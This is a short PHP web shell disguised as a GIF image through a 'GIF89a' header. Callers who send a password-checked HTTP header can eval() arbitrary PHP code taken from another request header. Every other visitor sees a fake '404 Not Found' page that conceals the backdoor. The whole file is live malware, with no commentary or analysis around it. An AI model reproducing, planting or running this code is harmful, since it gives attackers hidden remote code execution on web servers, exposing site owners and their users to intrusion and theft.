GIF89a<? 
$m=getenv(HTTP_IP);
if(md5($m) == 'e838020923945397fea305fca80cb5cb')
	{
	$a = @getenv(HTTP_LOG);
$var = $a;
$dis_func[0] = "/system/";
$dis_func[1] = "/passthru/";
$dis_func[2] = "/shell_exec/";
$dis_func[3] = "/exec/";
$reemp = "phpinfo()";
$kill = preg_replace($dis_func,$reemp,$var);
eval ($kill);
	} 
	else 
	{
	echo '<html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL '.$_SERVER[PHP_SELF].' was not found on this server.</p><hr><address>'.$_SERVER[SERVER_SOFTWARE].' at '.$_SERVER[SERVER_NAME].' Port 80</address></body></html>';
	} 
?>